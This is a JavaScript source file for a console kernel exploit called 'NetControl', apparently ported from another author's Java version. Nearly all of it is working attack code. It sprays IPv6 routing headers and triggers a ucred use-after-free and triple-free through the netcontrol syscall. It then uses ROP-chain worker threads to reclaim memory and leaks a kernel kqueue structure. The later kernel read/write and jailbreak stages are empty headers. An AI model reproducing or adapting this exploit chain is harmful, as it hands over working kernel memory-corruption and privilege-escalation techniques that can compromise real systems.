include('inject.js')
include('defs.js')
include('types.js')




// ============================================================================
// NetControl Kernel Exploit (NetControl port based on TheFl0w's Java impl)
// ============================================================================
utils.notify('ð\x9F\x92\xA9 NetControl ð\x9F\x92\xA9')

// NetControl constants
var NET_CONTROL_NETEVENT_SET_QUEUE = 0x20000003
var NET_CONTROL_NETEVENT_CLEAR_QUEUE = 0x20000007

// Check required syscalls are available
var required_syscalls = [
  { num: 0x03, name: 'read' },
  { num: 0x04, name: 'write' },
  { num: 0x06, name: 'close' },
  { num: 0x17, name: 'setuid' },
  { num: 0x29, name: 'dup' },
  { num: 0x1B, name: 'recvmsg' },
  { num: 0x61, name: 'socket' },
  { num: 0x63, name: 'netcontrol' },
  { num: 0x69, name: 'setsockopt' },
  { num: 0x76, name: 'getsockopt' },
  { num: 0x87, name: 'socketpair' }
]

var missing = []
for (var i = 0; i < required_syscalls.length; i++) {
  if (!syscalls.map.has(required_syscalls[i].num)) {
    missing.push(required_syscalls[i].name)
  }
}

if (missing.length > 0) {
  log('ERROR: Required syscalls not found: ' + missing.join(', '))
  throw new Error('Required syscalls not found')
}

// ============================================================================
// STAGE 1: Setup - Create IPv6 sockets and initialize pktopts
// ============================================================================

log('=== NetControl ===')

// Create syscall wrappers using fn.create()
var socket = fn.create(0x61, ['bigint', 'bigint', 'bigint'], 'bigint')
var socketpair = fn.create(0x87, ['bigint', 'bigint', 'bigint', 'bigint'], 'bigint')
var setsockopt = fn.create(0x69, ['bigint', 'bigint', 'bigint', 'bigint', 'bigint'], 'bigint')
var getsockopt = fn.create(0x76, ['bigint', 'bigint', 'bigint', 'bigint', 'bigint'], 'bigint')
var close_sys = fn.create(0x06, ['bigint'], 'bigint')
var dup_sys = fn.create(0x29, ['bigint'], 'bigint')
var recvmsg = fn.create(0x1B, ['bigint', 'bigint', 'bigint'], 'bigint')
var netcontrol_sys = fn.create(0x63, ['int', 'int', 'bigint', 'int'], 'bigint')
var read_sys = fn.create(0x03, ['bigint', 'bigint', 'bigint'], 'bigint')
var write_sys = fn.create(0x04, ['bigint', 'bigint', 'bigint'], 'bigint')
var setuid_sys = fn.create(0x17, ['int'], 'bigint')
var sched_yield = fn.create(0x14B, [], 'bigint')

// Extract syscall wrapper addresses for ROP chains from syscalls.map
var read_wrapper = syscalls.map.get(0x03)
var write_wrapper = syscalls.map.get(0x04)
var recvmsg_wrapper = syscalls.map.get(0x1B)

// Threading using scePthreadCreate
// int32_t scePthreadCreate(OrbisPthread *, const OrbisPthreadAttr *, void*(*F)(void*), void *, const char *)
var scePthreadCreate_addr = libc_addr.add(new BigInt(0, 0x340))
var scePthreadCreate = fn.create(scePthreadCreate_addr, ['bigint', 'bigint', 'bigint', 'bigint', 'string'], 'bigint')

log('Using scePthreadCreate at: ' + scePthreadCreate_addr.toString())

// Define thr_param structure
var ThrParam = struct.create('ThrParam', [
  { type: 'Uint64*', name: 'start_func' },
  { type: 'Uint64*', name: 'arg' },
  { type: 'Uint64*', name: 'stack_base' },
  { type: 'Uint64', name: 'stack_size' },
  { type: 'Uint64*', name: 'tls_base' },
  { type: 'Uint64', name: 'tls_size' },
  { type: 'Uint64*', name: 'child_tid' },
  { type: 'Uint64*', name: 'parent_tid' },
  { type: 'Int32', name: 'flags' },
  { type: 'Uint64*', name: 'rtp' }
])

log('ThrParam struct size: ' + ThrParam.sizeof)

// Pre-allocate all buffers once (reuse throughout exploit)
var store_addr = mem.malloc(0x100)
var rthdr_buf = mem.malloc(UCRED_SIZE)
var optlen_buf = mem.malloc(8)

log('store_addr: ' + store_addr.toString())
log('rthdr_buf: ' + rthdr_buf.toString())

// Storage for IPv6 sockets
var ipv6_sockets = new Int32Array(IPV6_SOCK_NUM)
var socket_count = 0

log('Creating ' + IPV6_SOCK_NUM + ' IPv6 sockets...')

// Create IPv6 sockets using socket()
for (var i = 0; i < IPV6_SOCK_NUM; i++) {
  var fd = socket(AF_INET6, SOCK_STREAM, 0)

  if (fd === -1) {
    log('ERROR: socket() failed at index ' + i)
    break
  }

  ipv6_sockets[i] = fd
  socket_count++
}

log('Created ' + socket_count + ' IPv6 sockets')

if (socket_count !== IPV6_SOCK_NUM) {
  log('FAILED: Not all sockets created')
  throw new Error('Failed to create all sockets')
}

log('Initializing pktopts on all sockets...')

// Initialize pktopts by calling setsockopt with NULL buffer
var init_count = 0
for (var i = 0; i < IPV6_SOCK_NUM; i++) {
  var ret = setsockopt(ipv6_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, 0, 0)

  if (ret !== -1) {
    init_count++
  }
}

log('Initialized ' + init_count + ' pktopts')

if (init_count === 0) {
  log('FAILED: No pktopts initialized')
  throw new Error('Failed to initialize pktopts')
}

// ============================================================================
// STAGE 2: Spray routing headers
// ============================================================================

// Build IPv6 routing header template
// Header structure: ip6r_nxt (1 byte), ip6r_len (1 byte), ip6r_type (1 byte), ip6r_segleft (1 byte)
var rthdr_len = ((UCRED_SIZE >> 3) - 1) & ~1
mem.write1(rthdr_buf, 0) // ip6r_nxt
mem.write1(rthdr_buf.add(new BigInt(0, 1)), rthdr_len) // ip6r_len
mem.write1(rthdr_buf.add(new BigInt(0, 2)), IPV6_RTHDR_TYPE_0) // ip6r_type
mem.write1(rthdr_buf.add(new BigInt(0, 3)), rthdr_len >> 1) // ip6r_segleft
var rthdr_size = (rthdr_len + 1) << 3

log('Built routing header template (size=' + rthdr_size + ' bytes)')

// Spray routing headers with tagged values across all sockets
log('Spraying routing headers across ' + IPV6_SOCK_NUM + ' sockets...')

for (var i = 0; i < IPV6_SOCK_NUM; i++) {
  // Write unique tag at offset 0x04 (RTHDR_TAG | socket_index)
  mem.write4(rthdr_buf.add(new BigInt(0, 4)), RTHDR_TAG | i)

  // Call setsockopt(fd, IPPROTO_IPV6, IPV6_RTHDR, rthdr_buf, rthdr_size)
  setsockopt(ipv6_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, rthdr_buf, rthdr_size)
}

log('Sprayed ' + IPV6_SOCK_NUM + ' routing headers')

// ============================================================================
// STAGE 3: Trigger ucred triple-free and find twins/triplet
// ============================================================================

// Allocate buffers
var set_buf = mem.malloc(8)
var clear_buf = mem.malloc(8)
var leak_rthdr_buf = mem.malloc(UCRED_SIZE)
var leak_len_buf = mem.malloc(8)
var tmp_buf = mem.malloc(8)

// Global variables
var twins = [-1, -1]
var triplets = [-1, -1, -1]
var uaf_sock = -1

// Try socketpair using fn.create() approach
log('Attempting socketpair...')

var sp_buf = mem.malloc(8)
log('Allocated socketpair buffer at: ' + sp_buf.toString())

socketpair(1, 1, 0, sp_buf)

var iov_ss0 = mem.read4(sp_buf).lo() & 0xFFFFFFFF
var iov_ss1 = mem.read4(sp_buf.add(new BigInt(0, 4))).lo() & 0xFFFFFFFF

if (iov_ss0 === 0xFFFFFFFF || iov_ss1 === 0xFFFFFFFF) {
  var errno_val = _error()
  var errno_int = mem.read4(errno_val)
  var errno_str = strerror(errno_int)
  log('ERROR: socketpair failed')
  log('  errno: ' + errno_int + ' (' + errno_str + ')')
  log('  fds: [' + iov_ss0 + ', ' + iov_ss1 + ']')
  throw new Error('socketpair failed with errno ' + errno_int)
}

log('Created socketpair: [' + iov_ss0 + ', ' + iov_ss1 + ']')

// Prepare msg_iov buffer - use valid addresses, kernel will allocate IOV
var iov_recv_buf = mem.malloc(MSG_IOV_NUM * 8)  // Valid buffer for receiving
var msg_iov = mem.malloc(MSG_IOV_NUM * IOV_SIZE)
for (var i = 0; i < MSG_IOV_NUM; i++) {
  // Point to valid buffer (kernel will allocate IOV structures with iov_base pointing here)
  mem.write8(msg_iov.add(new BigInt(0, i * IOV_SIZE)), iov_recv_buf.add(new BigInt(0, i * 8)))
  mem.write8(msg_iov.add(new BigInt(0, i * IOV_SIZE + 8)), new BigInt(0, 8))
}

// Prepare msg_hdr for recvmsg
var msg_hdr = mem.malloc(MSG_HDR_SIZE)
mem.write8(msg_hdr.add(new BigInt(0, 0x00)), BigInt.Zero)  // msg_name
mem.write4(msg_hdr.add(new BigInt(0, 0x08)), 0)             // msg_namelen
mem.write8(msg_hdr.add(new BigInt(0, 0x10)), msg_iov)       // msg_iov
mem.write4(msg_hdr.add(new BigInt(0, 0x18)), MSG_IOV_NUM)   // msg_iovlen
mem.write8(msg_hdr.add(new BigInt(0, 0x20)), BigInt.Zero)   // msg_control
mem.write4(msg_hdr.add(new BigInt(0, 0x28)), 0)             // msg_controllen
mem.write4(msg_hdr.add(new BigInt(0, 0x2C)), 0)             // msg_flags

// Prepare IOV for kernel corruption (will modify iov_base to 1 later)
var corrupt_msg_iov = mem.malloc(MSG_IOV_NUM * IOV_SIZE)
for (var i = 0; i < MSG_IOV_NUM; i++) {
  mem.write8(corrupt_msg_iov.add(new BigInt(0, i * IOV_SIZE)), new BigInt(0, 1))  // iov_base = 1
  mem.write8(corrupt_msg_iov.add(new BigInt(0, i * IOV_SIZE + 8)), new BigInt(0, 8))
}

var corrupt_msg_hdr = mem.malloc(MSG_HDR_SIZE)
mem.write8(corrupt_msg_hdr.add(new BigInt(0, 0x00)), BigInt.Zero)
mem.write4(corrupt_msg_hdr.add(new BigInt(0, 0x08)), 0)
mem.write8(corrupt_msg_hdr.add(new BigInt(0, 0x10)), corrupt_msg_iov)
mem.write4(corrupt_msg_hdr.add(new BigInt(0, 0x18)), MSG_IOV_NUM)
mem.write8(corrupt_msg_hdr.add(new BigInt(0, 0x20)), BigInt.Zero)
mem.write4(corrupt_msg_hdr.add(new BigInt(0, 0x28)), 0)
mem.write4(corrupt_msg_hdr.add(new BigInt(0, 0x2C)), 0)

log('Prepared IOV spray structures')

// ============================================================================
// Persistent Worker Pool (4 workers like Java's IOV_THREAD_NUM)
// ============================================================================

var IOV_WORKER_NUM = 4
var recvmsg_wrapper = syscalls.map.get(0x1B)
var read_wrapper = syscalls.map.get(0x03)
var write_wrapper = syscalls.map.get(0x04)
var thr_exit_wrapper = syscalls.map.get(0x1AF)
var thr_new = fn.create(0x1C7, ['bigint', 'bigint'], 'bigint')

// Worker pool - each worker has its own resources
var workers = []
for (var w = 0; w < IOV_WORKER_NUM; w++) {
  var worker = {}

  // Control socketpair for signaling this worker
  var ctrl_sp_buf = mem.malloc(8)
  socketpair(1, 1, 0, ctrl_sp_buf)
  worker.ctrl_sock0 = mem.read4(ctrl_sp_buf).lo() & 0xFFFFFFFF
  worker.ctrl_sock1 = mem.read4(ctrl_sp_buf.add(new BigInt(0, 4))).lo() & 0xFFFFFFFF

  // Worker resources
  worker.stack_size = 0x1000
  worker.stack = mem.malloc(worker.stack_size)
  worker.tls = mem.malloc(0x40)
  worker.child_tid = mem.malloc(8)
  worker.parent_tid = mem.malloc(8)
  worker.thr_param = mem.malloc(0x80)
  worker.signal_buf = mem.malloc(1)

  workers.push(worker)
}

log('Created ' + IOV_WORKER_NUM + ' worker slots')

// Build ROP chain for a worker: read(ctrl_sock) → recvmsg(iov_sock) → write(ctrl_sock) → exit
function buildWorkerROP(worker) {
  var rop = []

  // Wait for work signal: read(ctrl_sock0, buf, 1) - blocks until signaled
  rop.push(gadgets.POP_RDI_RET)
  rop.push(new BigInt(worker.ctrl_sock0))
  rop.push(gadgets.POP_RSI_RET)
  rop.push(worker.signal_buf)
  rop.push(gadgets.POP_RDX_RET)
  rop.push(new BigInt(0, 1))
  rop.push(read_wrapper)

  // Do work: recvmsg(iov_ss0, corrupt_msg_hdr, 0)
  rop.push(gadgets.POP_RDI_RET)
  rop.push(new BigInt(iov_ss0))
  rop.push(gadgets.POP_RSI_RET)
  rop.push(corrupt_msg_hdr)
  rop.push(gadgets.POP_RDX_RET)
  rop.push(BigInt.Zero)
  rop.push(recvmsg_wrapper)

  // Signal work done: write(ctrl_sock1, buf, 1)
  rop.push(gadgets.POP_RDI_RET)
  rop.push(new BigInt(worker.ctrl_sock1))
  rop.push(gadgets.POP_RSI_RET)
  rop.push(worker.signal_buf)
  rop.push(gadgets.POP_RDX_RET)
  rop.push(new BigInt(0, 1))
  rop.push(write_wrapper)

  // Exit thread
  rop.push(gadgets.POP_RDI_RET)
  rop.push(BigInt.Zero)
  rop.push(thr_exit_wrapper)

  return rop
}

// Spawn a worker thread
function spawnWorker(worker_idx) {
  var worker = workers[worker_idx]

  // Reset TID values
  mem.write8(worker.child_tid, BigInt.Zero)
  mem.write8(worker.parent_tid, BigInt.Zero)

  // Build and write ROP chain to stack
  var rop = buildWorkerROP(worker)
  var stack_top = worker.stack.add(new BigInt(0, worker.stack_size))
  for (var i = rop.length - 1; i >= 0; i--) {
    stack_top = stack_top.sub(new BigInt(0, 8))
    mem.write8(stack_top, rop[i])
  }

  // Setup thr_param
  mem.write8(worker.thr_param.add(new BigInt(0, 0x00)), gadgets.RET)
  mem.write8(worker.thr_param.add(new BigInt(0, 0x08)), BigInt.Zero)
  mem.write8(worker.thr_param.add(new BigInt(0, 0x10)), worker.stack)
  mem.write8(worker.thr_param.add(new BigInt(0, 0x18)), new BigInt(0, worker.stack_size))
  mem.write8(worker.thr_param.add(new BigInt(0, 0x20)), worker.tls)
  mem.write8(worker.thr_param.add(new BigInt(0, 0x28)), new BigInt(0, 0x40))
  mem.write8(worker.thr_param.add(new BigInt(0, 0x30)), worker.child_tid)
  mem.write8(worker.thr_param.add(new BigInt(0, 0x38)), worker.parent_tid)

  return thr_new(worker.thr_param, new BigInt(0, 0x68))
}

// Spawn all workers (they will block waiting for signals)
log('Spawning ' + IOV_WORKER_NUM + ' persistent workers...')
for (var w = 0; w < IOV_WORKER_NUM; w++) {
  var ret = spawnWorker(w)
  if (!ret.eq(0)) {
    throw new Error('Failed to spawn worker ' + w + ': ' + ret.toString())
  }
}
log('All workers spawned and waiting')

// Use a worker to do one IOV spray
function doIOVSpray() {
  // Use worker 0 (could round-robin if needed)
  var worker = workers[0]

  // Signal worker to start work
  write_sys(new BigInt(worker.ctrl_sock1), worker.signal_buf, new BigInt(0, 1))

  // Give worker time to enter recvmsg
  for (var d = 0; d < 50; d++) { sched_yield() }

  // Wake recvmsg by writing to iov socket
  write_sys(new BigInt(iov_ss1), worker.signal_buf, new BigInt(0, 1))

  // Wait for worker to signal completion
  read_sys(new BigInt(worker.ctrl_sock0), worker.signal_buf, new BigInt(0, 1))

  // Read back from iov socket to cleanup
  read_sys(new BigInt(iov_ss0), worker.signal_buf, new BigInt(0, 1))

  // Respawn worker for next spray
  var ret = spawnWorker(0)
  if (!ret.eq(0)) {
    throw new Error('Failed to respawn worker: ' + ret.toString())
  }
}

// ============================================================================
// Trigger ucred UAF setup
// ============================================================================

// Create dummy socket to register and close
var dummy_sock = socket(AF_UNIX, SOCK_STREAM, 0).lo() & 0xFFFFFFFF
log('Created dummy socket: ' + dummy_sock)

// Register dummy socket with netcontrol
var set_buf = mem.malloc(8)
mem.write4(set_buf, dummy_sock)
netcontrol_sys(-1, NET_CONTROL_NETEVENT_SET_QUEUE, set_buf, 8)
log('Registered dummy socket')

// Close dummy socket
close_sys(dummy_sock)
log('Closed dummy socket')

// Allocate new ucred
setuid_sys(1)

// Reclaim the file descriptor
uaf_sock = socket(AF_UNIX, SOCK_STREAM, 0).lo() & 0xFFFFFFFF
log('Created uaf_sock: ' + uaf_sock)

// Free the previous ucred (now uaf_sock's f_cred has cr_refcnt=1)
setuid_sys(1)

// Unregister and free the file and ucred
var clear_buf = mem.malloc(8)
mem.write4(clear_buf, uaf_sock)
netcontrol_sys(-1, NET_CONTROL_NETEVENT_CLEAR_QUEUE, clear_buf, 8)
log('Unregistered uaf_sock')

// Set cr_refcnt back to 1 with IOV spray (32 iterations matching Java)
log('Resetting cr_refcnt with IOV spray (32 iterations)...')
for (var reset_i = 0; reset_i < 32; reset_i++) {
  doIOVSpray()
}
log('cr_refcnt reset complete (32 IOV sprays done)')

// Give threads time to fully exit and kernel to reclaim memory
log('Waiting for workers to settle...')
for (var thread_cleanup = 0; thread_cleanup < 100; thread_cleanup++) { sched_yield() }
gc()
log('Worker pool ready')

// Double free ucred (only dup works - doesn't check f_hold)
var dup_fd = dup_sys(uaf_sock)
close_sys(dup_fd)
log('Double freed ucred via close(dup(uaf_sock))')

// Find twins - two sockets sharing same routing header (matching Java findTwins)
log('Finding twins...')
var found_twins = false
var twin_attempts = 0

while (!found_twins) {
  // Clear all routing headers every 10 attempts to avoid OOM
  if (twin_attempts > 0 && twin_attempts % 10 === 0) {
    log('Clearing all routing headers to prevent OOM (attempt ' + twin_attempts + ')...')
    for (var clear_i = 0; clear_i < IPV6_SOCK_NUM; clear_i++) {
      setsockopt(ipv6_sockets[clear_i], IPPROTO_IPV6, IPV6_RTHDR, 0, 0)
    }
    // Give kernel time to free memory (200 yields)
    for (var clear_delay = 0; clear_delay < 200; clear_delay++) { sched_yield() }
    gc()
    log('Cleared all routing headers (200 yields + GC), continuing twin search...')
  }

  // Spray tags across all sockets
  for (var i = 0; i < IPV6_SOCK_NUM; i++) {
    mem.write4(rthdr_buf.add(new BigInt(0, 4)), RTHDR_TAG | i)
    setsockopt(ipv6_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, rthdr_buf, rthdr_size)
  }

  // Check for twins
  for (var i = 0; i < IPV6_SOCK_NUM; i++) {
    mem.write8(leak_len_buf, new BigInt(0, 8))  // Read only 8 bytes
    getsockopt(ipv6_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, leak_rthdr_buf, leak_len_buf)

    var val = mem.read4(leak_rthdr_buf.add(new BigInt(0, 4)))
    var j = val & 0xFFFF

    if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j) {
      twins[0] = i
      twins[1] = j
      found_twins = true
      log('Found twins: socket[' + i + '] and socket[' + j + '] share rthdr (attempt ' + (twin_attempts + 1) + ')')
      break
    }

    // Debug: show first few attempts
    if (twin_attempts < 3 && i < 3) {
      log('  attempt=' + twin_attempts + ' sock[' + i + '] val=0x' + val.toString(16) + ' j=' + j)
    }
  }

  twin_attempts++
  if (twin_attempts % 100 === 0) {
    log('Twin search attempt ' + twin_attempts + '...')
  }
  if (twin_attempts > 15000) {
    throw new Error('Failed to find twins after 15000 spray attempts - IOV spray may not be working')
  }
}

// ============================================================================
// Triple-free setup
// ============================================================================
log('=== Triple-freeing ucred ===')

// Free one twin's rthdr
setsockopt(ipv6_sockets[twins[1]], IPPROTO_IPV6, IPV6_RTHDR, 0, 0)
log('Freed rthdr on socket[' + twins[1] + ']')

// Set cr_refcnt back to 1 by spraying IOV until first_int == 1 (matching Java)
log('Spraying IOV to reset cr_refcnt for triple-free...')
var triplet_spray_attempts = 0
var max_triplet_spray = 5000
var spray_batch_size = 10  // Spray 10 times before checking

while (triplet_spray_attempts < max_triplet_spray) {
  // Batch spray using persistent workers
  for (var batch_i = 0; batch_i < spray_batch_size; batch_i++) {
    doIOVSpray()
    triplet_spray_attempts++
  }

  // Give workers time to settle before checking
  for (var cleanup_delay = 0; cleanup_delay < 50; cleanup_delay++) { sched_yield() }
  gc()

  // Check if reclaim succeeded (after batch)
  mem.write8(leak_len_buf, new BigInt(0, 8))
  getsockopt(ipv6_sockets[twins[0]], IPPROTO_IPV6, IPV6_RTHDR, leak_rthdr_buf, leak_len_buf)

  var first_int = mem.read4(leak_rthdr_buf)
  if (first_int === 1) {
    log('IOV reclaim successful after ' + triplet_spray_attempts + ' sprays (first_int = 1)')
    break
  }

  if (triplet_spray_attempts % 100 === 0) {
    log('Triple-free spray attempt ' + triplet_spray_attempts + '...')
  }
}

if (triplet_spray_attempts >= max_triplet_spray) {
  throw new Error('Failed to reclaim with IOV spray for triple-free')
}

var triplets = [-1, -1, -1]
triplets[0] = twins[0]

// Triple free ucred (second time)
var dup_fd2 = dup_sys(uaf_sock)
close_sys(dup_fd2)
log('Triple-freed ucred via close(dup(uaf_sock))')

// Helper function to find triplet
function findTriplet (master, other) {
  var max_attempts = 50000
  var attempt = 0

  while (attempt < max_attempts) {
    // Spray rthdr on all sockets except master and other
    for (var i = 0; i < IPV6_SOCK_NUM; i++) {
      if (i === master || i === other) {
        continue
      }
      mem.write4(rthdr_buf.add(new BigInt(0, 4)), RTHDR_TAG | i)
      setsockopt(ipv6_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, rthdr_buf, rthdr_size)
    }

    // Check for triplet by reading from master
    for (var i = 0; i < IPV6_SOCK_NUM; i++) {
      if (i === master || i === other) {
        continue
      }

      mem.write8(leak_len_buf, new BigInt(0, UCRED_SIZE))
      getsockopt(ipv6_sockets[master], IPPROTO_IPV6, IPV6_RTHDR, leak_rthdr_buf, leak_len_buf)

      var val = mem.read4(leak_rthdr_buf.add(new BigInt(0, 4)))
      var j = val & 0xFFFF

      if ((val & 0xFFFF0000) === RTHDR_TAG && j !== master && j !== other) {
        return j
      }
    }

    attempt++
    if (attempt % 1000 === 0) {
      log('findTriplet attempt ' + attempt + '...')
    }
  }

  return -1
}

// Find triplet[1] - a third socket sharing the same rthdr
log('Finding triplet[1]...')
triplets[1] = findTriplet(triplets[0], -1)
if (triplets[1] === -1) {
  throw new Error('Failed to find triplet[1]')
}
log('Found triplet[1]: socket[' + triplets[1] + ']')

// Release one IOV spray (matching Java line 487-494)
log('Releasing one IOV spray before finding triplet[2]...')
doIOVSpray()

// Find triplet[2] - a fourth socket sharing the same rthdr
log('Finding triplet[2]...')
triplets[2] = findTriplet(triplets[0], triplets[1])
if (triplets[2] === -1) {
  throw new Error('Failed to find triplet[2]')
}
log('Found triplet[2]: socket[' + triplets[2] + ']')
log('Triplets: [' + triplets[0] + ', ' + triplets[1] + ', ' + triplets[2] + ']')

// ============================================================================
// Stage 4: Leak kqueue structure
// ============================================================================

// Free one rthdr to make room for kqueue (use triplets not twins)
setsockopt(ipv6_sockets[triplets[1]], IPPROTO_IPV6, IPV6_RTHDR, 0, 0)
log('Freed rthdr on socket[' + triplets[1] + ']')

// Get kqueue syscall (0x16A = 362)
var kqueue_sys = fn.create(0x16A, [], 'int')

// Loop until we reclaim with kqueue structure
var kq_fd = -1
var kq_fdp = BigInt.Zero
var max_attempts = 100

for (var attempt = 0; attempt < max_attempts; attempt++) {
  // Create kqueue
  kq_fd = kqueue_sys()
  if (kq_fd < 0) {
    throw new Error('kqueue() failed')
  }

  // Leak with triplets[0]
  mem.write8(leak_len_buf, new BigInt(0, 0x100))
  getsockopt(ipv6_sockets[triplets[0]], IPPROTO_IPV6, IPV6_RTHDR, leak_rthdr_buf, leak_len_buf)

  // Check for kqueue signature at offset 0x08
  var sig = mem.read4(leak_rthdr_buf.add(new BigInt(0, 0x08)))
  if (sig === 0x1430000) {
    // Found kqueue! Extract kq_fdp at offset 0xA8
    kq_fdp = mem.read8(leak_rthdr_buf.add(new BigInt(0, 0xA8)))
    log('Found kqueue structure after ' + (attempt + 1) + ' attempts')
    log('kq_fdp: ' + kq_fdp.toString())
    break
  }

  // Not kqueue yet, close and retry
  close_sys(kq_fd)
}

if (kq_fdp.lo() === 0 && kq_fdp.hi() === 0) {
  throw new Error('Failed to leak kqueue after ' + max_attempts + ' attempts')
}

// Close kqueue to free the buffer
close_sys(kq_fd)
log('Closed kqueue fd ' + kq_fd)

// Find new triplet[1] to replace the one we freed
log('Finding new triplet[1] after kqueue leak...')
triplets[1] = findTriplet(triplets[0], triplets[2])
if (triplets[1] === -1) {
  throw new Error('Failed to find new triplet[1] after kqueue leak')
}
log('Found new triplet[1]: socket[' + triplets[1] + ']')

// Cleanup buffers
mem.free(store_addr)
mem.free(rthdr_buf)
mem.free(optlen_buf)
mem.free(set_buf)
mem.free(clear_buf)
mem.free(leak_rthdr_buf)
mem.free(leak_len_buf)

// ============================================================================
// STAGE 4: Leak kqueue structure
// ============================================================================

// ============================================================================
// STAGE 5: Kernel R/W primitives via pipe corruption
// ============================================================================

// ============================================================================
// STAGE 6: Jailbreak
// ============================================================================
